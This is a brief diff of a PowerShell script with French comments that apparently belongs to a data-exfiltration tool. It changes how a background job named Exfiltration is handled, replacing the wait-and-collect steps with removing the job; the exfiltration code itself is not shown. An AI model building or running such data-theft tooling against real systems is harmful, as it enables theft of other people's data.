@@ -120,8 +120,5 @@ function Exflitration {
 # Lancer la fonction Exfiltration en arrière-plan
 $ExfiltrationJob = Start-Job -ScriptBlock $ExfiltrationScript
 
-# Attendre que le job Exfiltration soit terminé
-Wait-Job $ExfiltrationJob | Out-Null
-
-# Récupérer les résultats du job si nécessaire
-$ExfiltrationResults = Receive-Job $ExfiltrationJob
+# Fermer le job
+Remove-Job $ExfiltrationJob
